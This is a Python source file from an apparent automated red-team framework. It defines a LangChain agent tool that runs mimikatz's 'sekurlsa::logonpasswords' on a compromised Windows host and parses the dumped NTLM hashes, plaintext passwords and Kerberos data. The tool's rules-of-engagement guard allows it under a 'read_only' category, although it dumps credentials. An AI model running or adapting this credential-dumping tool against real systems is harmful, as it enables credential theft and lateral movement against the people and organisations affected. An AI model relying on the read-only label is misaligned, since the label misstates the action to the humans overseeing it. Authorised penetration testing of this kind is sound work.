"""AutoRed mimikatz tool wrapper — Phase 4, Task 5.

``mimikatz`` is the canonical Windows post-exploitation tool from gentilkiwi
that dumps credentials from LSASS memory: NTLM hashes from the ``msv``
provider, plaintext passwords from the ``tspkg`` / ``wdigest`` providers
(where the LSA secret-encryption key has been recovered), Kerberos tickets
from the ``kerberos`` provider, etc.

Per the T5 brief, this wrapper does NOT actually execute mimikatz in
Phase 4. It constructs the mimikatz command string (``privilege::debug``
to grab SeDebugPrivilege, then ``sekurlsa::logonpasswords`` to dump every
logon-session secret, then ``exit``) and persists it via ``_save_raw`` so
the Phase 6 FootholdSessionManager can replay it. The returned
``MimikatzResult`` has an empty ``credentials`` list. The
``_parse_mimikatz_output`` helper is exported so a Phase 6 caller can pass
real mimikatz stdout back through the same parser that the unit tests
exercise on the fixture file.

Decorator order (Ruling 1): ``@tool`` OUTER, ``@roe_guard`` INNER — see
``autored.tools.hydra`` for the rationale and the regression test in
``test_mimikatz_wrapper_ainvoke_works_with_roe_guard``.

Spec ref: §3.4 (post-ex models), §6.8 (RoE guard), §9.2 (RoE categories).
"""
from __future__ import annotations

import re

from langchain_core.tools import tool
from pydantic import BaseModel, Field

from autored.foothold_session import get_installed
from autored.logging import get_logger
from autored.roe_guard import roe_guard
from autored.tools.nmap import _save_raw  # reuse from nmap

log = get_logger("tools.mimikatz")


class MimikatzResult(BaseModel):
    """Parsed credentials harvested by mimikatz.

    Phase 4 callers receive this with ``credentials`` empty — real execution
    is deferred to Phase 6. Phase 6 callers receive this populated
    via ``_parse_mimikatz_output(real_stdout, host_ip)`` when the
    ``FootholdSessionManager`` is installed (otherwise the wrapper falls
    through to evidence-string mode).

    Each credential dict has keys: ``provider`` (``msv`` / ``tspkg`` /
    ``kerberos`` / etc.), ``username``, ``domain``, ``ntlm``, ``sha1``,
    ``password``. Missing fields are empty strings so callers can still
    see what *was* recovered.
    """

    host_ip: str
    credentials: list[dict[str, str]] = Field(default_factory=list)
    raw_output_path: str = ""
    command: str = ""
    duration_sec: float = 0.0


# Mimikatz prints credential-provider blocks as ``msv :`` / ``tspkg :`` /
# ``kerberos :`` etc. on their own line. The block-name pattern is anchored
# to the start of a line (mimikatz indents the block bodies with leading
# whitespace) so a "Domain :" field deeper in the report does NOT trigger
# a false block-start match.
_BLOCK_PATTERN = re.compile(
    r"^[ \t]*(msv|tspkg|kerberos|ssp|credman|wdigest)[ \t]*:[ \t]*$",
    re.IGNORECASE | re.MULTILINE,
)

# Fields within a block: ``* Username : value`` / ``* NTLM : value`` /
# ``* Password : value`` etc. The leading ``*`` is the mimikatz bullet
# marker; ``\S+`` captures everything up to the next whitespace (mimikatz
# field values are token-shaped — usernames, hashes, passwords — and do
# not contain embedded whitespace).
_FIELD_PATTERN = re.compile(
    r"\*[ \t]*(Username|Domain|NTLM|SHA1|SHA256|Password|Kerberos)[ \t]*:[ \t]*(\S+)",
    re.IGNORECASE,
)


def _parse_mimikatz_output(text: str, host_ip: str) -> MimikatzResult:
    """Parse mimikatz ``sekurlsa::logonpasswords`` stdout into a
    ``MimikatzResult``.

    Walks the credential-provider blocks (``msv``, ``tspkg``, ``kerberos``,
    ``ssp``, ``credman``, ``wdigest``) one at a time. For each block,
    collects the first occurrence of each credential field (``Username``,
    ``Domain``, ``NTLM``, ``SHA1``, ``SHA256``, ``Password``, ``Kerberos``)
    into a dict. A block is only appended to ``credentials`` if at least
    one field was actually populated — empty blocks (mimikatz sometimes
    prints a provider header with no creds beneath it) are dropped.

    Empty input must not crash — returns a result with an empty credentials
    list so calling tools can short-circuit safely.
    """
    result = MimikatzResult(host_ip=host_ip)
    if not text:
        return result

    # re.split with a capture group returns alternating non-match /
    # captured-group / non-match / captured-group / ... segments.
    # parts[0] = prelude before the first block; parts[1] = first block
    # name; parts[2] = first block body; parts[3] = second block name; ...
    parts = _BLOCK_PATTERN.split(text)
    i = 1
    while i + 1 < len(parts):
        block_name = parts[i].lower()
        block_body = parts[i + 1]
        cred: dict[str, str] = {
            "provider": block_name,
            "username": "",
            "domain": "",
            "ntlm": "",
            "sha1": "",
            "sha256": "",
            "password": "",
            "kerberos": "",
        }
        for m in _FIELD_PATTERN.finditer(block_body):
            key = m.group(1).lower()
            val = m.group(2)
            # First occurrence wins — mimikatz sometimes prints the same
            # field twice (Primary + Secondary slots) when a single logon
            # session has two credential blobs.
            if cred.get(key, "") == "":
                cred[key] = val
        # Only keep the block if at least one credential field was set
        # (drops empty "wdigest :" headers mimikatz prints even when no
        # wdigest secret was recovered for that logon session).
        if any(
            cred[k]
            for k in ("username", "domain", "ntlm", "sha1", "sha256", "password", "kerberos")
        ):
            result.credentials.append(cred)
        i += 2

    return result


@tool
@roe_guard(allowed_categories=["read_only"])
async def mimikatz_wrapper(
    foothold_id: str,
    host_ip: str,
    engagement_id: str = "",
) -> MimikatzResult:
    """Run mimikatz on a Windows foothold to dump LSASS credentials.

    The command is constructed for execution via the foothold's shell
    session. Actual execution requires the session manager (Phase 6). For
    now, this tool builds the command and saves it to
    ``engagements/<id>/raw/`` so the Phase 6 FootholdSessionManager can
    replay it; the returned ``MimikatzResult`` has an empty
    ``credentials`` list because no real mimikatz stdout was produced.

    Args:
        foothold_id: ID of the foothold to dump credentials from.
        host_ip: IP of the foothold host (used by the RoE guard scope
            check and recorded in ``MimikatzResult.host_ip``).
        engagement_id: Current engagement ID for raw output storage +
            RoE registry lookup.

    Returns:
        ``MimikatzResult`` with ``raw_output_path`` set (command was saved)
        and ``credentials`` empty (Phase 4 stub). Phase 6 callers will
        receive a populated result via the foothold shell session.
    """
    log.info("mimikatz_start", host_ip=host_ip, foothold_id=foothold_id)

    # Canonical mimikatz one-liner: SeDebugPrivilege → dump every logon
    # session's secrets → exit. The quoted-argument form survives a
    # ``sh -c`` replay on the foothold (mimikatz parses its own argv list,
    # and the quotes stop the foothold shell from word-splitting the
    # ``::`` module markers).
    cmd_str = (
        'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit'
    )

    # Phase 6: execute via the foothold session manager when installed.
    session = get_installed()
    if session is not None:
        foothold = session.find_foothold(foothold_id)
        exec_result = None
        if foothold is not None:
            exec_result = await session.execute(foothold, cmd_str)
        if exec_result is not None and exec_result.success:
            raw_path = await _save_raw(
                "mimikatz", host_ip, exec_result.stdout, exec_result.stderr,
                engagement_id,
            )
            parsed = _parse_mimikatz_output(exec_result.stdout, host_ip)
            parsed.raw_output_path = raw_path
            parsed.command = cmd_str
            parsed.duration_sec = exec_result.duration_sec
            log.info(
                "mimikatz_executed",
                host_ip=host_ip, duration=exec_result.duration_sec,
            )
            return parsed
        log.warning(
            "mimikatz_execution_unavailable",
            host_ip=host_ip,
            stderr=(exec_result.stderr if exec_result else "foothold not found"),
        )

    # Fallback: evidence-string mode (Phase 4 behavior).
    raw_path = await _save_raw("mimikatz_cmd", host_ip, cmd_str, "", engagement_id)
    log.info(
        "mimikatz_done",
        host_ip=host_ip,
        foothold_id=foothold_id,
        note="command saved, execution unavailable",
    )
    return MimikatzResult(
        host_ip=host_ip, raw_output_path=raw_path, command=cmd_str,
    )
